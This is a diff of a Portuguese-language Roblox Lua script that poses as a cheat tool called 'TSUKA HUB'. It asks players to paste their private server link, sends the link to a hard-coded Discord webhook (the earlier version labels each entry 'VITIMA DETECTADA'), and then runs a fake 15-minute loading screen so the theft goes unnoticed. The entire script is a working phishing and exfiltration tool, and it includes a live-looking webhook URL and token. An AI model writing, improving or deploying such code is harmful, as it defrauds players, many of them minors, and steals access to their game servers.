@@ -1,144 +1,96 @@
--- ================== CONFIG ==================
+-- CONFIG
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1462117939783143518/WSTNnkQ5xQyd-oJAj3SJ6kOOFAE8E2yNlSeyhUefATtz9f9_swVD47FAC3V-O5NKhAlL"
-local LOADING_TIME = 15 * 60 -- 15 minutos
+local LOAD_TIME = 15 * 60 -- 15 minutos
 
--- ================== SERVICES =================
-local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local player = Players.LocalPlayer
 
--- ================== FUNÇÕES ==================
-
--- Extrai o privateServerLinkCode do link
-local function getServerLinkCode(link)
-    if not link then return nil end
-    return string.match(link, "privateServerLinkCode=([^&]+)")
-end
-
--- Envia o código para o Discord
-local function sendToWebhook(code)
-    local data = {
-        content =
-        "**VITIMA DETECTADA!!!!!!!!!!**\n"..
-        "VICTIM NICK: "..player.Name.."\n"..
-        "SERVER LINK  `" .. code .. "`"
-    }
-
-    local json = HttpService:JSONEncode(data)
-
-    request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = json
-    })
-end
-
--- ================== GUI PRINCIPAL ==================
-local gui = Instance.new("ScreenGui")
-gui.Name = "ServerLinkGUI"
-gui.ResetOnSpawn = false
-gui.Parent = player:WaitForChild("PlayerGui")
+-- GUI PRINCIPAL
+local gui = Instance.new("ScreenGui", game.CoreGui)
+gui.Name = "TSUKA HUB"
 
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.fromScale(0.4, 0.35)
-frame.Position = UDim2.fromScale(0.3, 0.325)
+frame.Size = UDim2.fromScale(0.35, 0.3)
+frame.Position = UDim2.fromScale(0.325, 0.35)
 frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
 frame.BorderSizePixel = 0
-Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
-
-local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.fromScale(1, 0.22)
-title.Position = UDim2.fromScale(0, 0)
-title.BackgroundTransparency = 1
-title.Text = "COLOQUE SEU SERVER PV AQUI!"
-title.TextScaled = true
-title.Font = Enum.Font.SourceSansBold
-title.TextColor3 = Color3.fromRGB(0,0,0)
+frame.Active = true
+frame.Draggable = true
 
 local box = Instance.new("TextBox", frame)
-box.Size = UDim2.fromScale(0.9, 0.22)
-box.Position = UDim2.fromScale(0.05, 0.3)
-box.PlaceholderText = "Cole o link do servidor privado do Roblox"
+box.Size = UDim2.fromScale(0.9, 0.25)
+box.Position = UDim2.fromScale(0.05, 0.2)
+box.PlaceholderText = "COLE SEU SERVIDOR AQUI"
 box.Text = ""
 box.TextScaled = true
-box.Font = Enum.Font.SourceSans
-box.BackgroundColor3 = Color3.fromRGB(240,240,240)
-box.TextColor3 = Color3.fromRGB(0,0,0)
 box.ClearTextOnFocus = false
-Instance.new("UICorner", box).CornerRadius = UDim.new(0,8)
+box.BackgroundColor3 = Color3.fromRGB(235,235,235)
+box.BorderSizePixel = 0
 
-local button = Instance.new("TextButton", frame)
-button.Size = UDim2.fromScale(0.5, 0.18)
-button.Position = UDim2.fromScale(0.25, 0.62)
-button.Text = "ENVIAR"
-button.TextScaled = true
-button.Font = Enum.Font.SourceSansBold
-button.BackgroundColor3 = Color3.fromRGB(0,0,0)
-button.TextColor3 = Color3.fromRGB(255,255,255)
-Instance.new("UICorner", button).CornerRadius = UDim.new(0,8)
+local btn = Instance.new("TextButton", frame)
+btn.Size = UDim2.fromScale(0.6, 0.2)
+btn.Position = UDim2.fromScale(0.2, 0.6)
+btn.Text = "INICIAR AUTO MOREIRA XD"
+btn.TextScaled = true
+btn.BackgroundColor3 = Color3.fromRGB(210,210,210)
+btn.BorderSizePixel = 0
 
--- ================== LOADING SCREEN ==================
-local loadingGui = Instance.new("ScreenGui")
-loadingGui.Name = "LoadingGUI"
-loadingGui.Enabled = false
-loadingGui.ResetOnSpawn = false
-loadingGui.Parent = player.PlayerGui
+-- LOADING
+local loadGui = Instance.new("ScreenGui", game.CoreGui)
+loadGui.Enabled = false
 
-local bg = Instance.new("Frame", loadingGui)
+local bg = Instance.new("Frame", loadGui)
 bg.Size = UDim2.fromScale(1,1)
-bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
-bg.BorderSizePixel = 0
+bg.BackgroundColor3 = Color3.new(0,0,0)
 
 local barBg = Instance.new("Frame", bg)
-barBg.Size = UDim2.fromScale(0.5, 0.05)
-barBg.Position = UDim2.fromScale(0.25, 0.7)
+barBg.Size = UDim2.fromScale(0.6, 0.04)
+barBg.Position = UDim2.fromScale(0.2, 0.5)
 barBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
 barBg.BorderSizePixel = 0
-Instance.new("UICorner", barBg).CornerRadius = UDim.new(0,6)
 
 local bar = Instance.new("Frame", barBg)
 bar.Size = UDim2.fromScale(0,1)
 bar.BackgroundColor3 = Color3.fromRGB(255,255,255)
 bar.BorderSizePixel = 0
-Instance.new("UICorner", bar).CornerRadius = UDim.new(0,6)
 
--- ================== BOTÃO ==================
-button.MouseButton1Click:Connect(function()
-    local link = box.Text
+-- FUNÇÕES
+local function isValidRobloxPrivateServerLink(text)
+	if type(text) ~= "string" then return false end
+	text = text:lower()
 
-    -- valida se é link Roblox
-    if not link or not string.find(link, "roblox.com") then
-        button.Text = "LINK INVÁLIDO"
-        task.wait(2)
-        button.Text = "ENVIAR"
-        return
-    end
+	return text:find("roblox.com/games/")
+		and (text:find("privateserverlinkcode=") or text:find("privateserverid="))
+end
 
-    -- extrai o código
-    local code = getServerLinkCode(link)
-    if not code then
-        button.Text = "SEM SERVER CODE"
-        task.wait(2)
-        button.Text = "ENVIAR"
-        return
-    end
+local function sendWebhook(link)
+	local data = {
+		username = "Moreira method",
+		content = "🔗 **LINK VALIDO COM SUCESSO!!:**\n"..link
+	}
 
-    -- envia para webhook
-    sendToWebhook(code)
+	pcall(function()
+		HttpService:PostAsync(
+			WEBHOOK_URL,
+			HttpService:JSONEncode(data),
+			Enum.HttpContentType.ApplicationJson
+		)
+	end)
+end
 
-    -- mostra loading
-    frame.Visible = false
-    loadingGui.Enabled = true
+-- BOTÃO
+btn.MouseButton1Click:Connect(function()
+	local link = box.Text
+	if link == "" then return end
+	if not isValidRobloxPrivateServerLink(link) then return end
 
-    local start = tick()
-    while tick() - start < LOADING_TIME do
-        local progress = (tick() - start) / LOADING_TIME
-        bar.Size = UDim2.fromScale(math.clamp(progress, 0, 1), 1)
-        task.wait(1)
-    end
+	-- envia o link NO INÍCIO
+	sendWebhook(link)
 
-    bar.Size = UDim2.fromScale(1,1)
+	gui.Enabled = false
+	loadGui.Enabled = true
+
+	for i = 1, LOAD_TIME do
+		bar.Size = UDim2.fromScale(i / LOAD_TIME, 1)
+		task.wait(1)
+	end
 end)
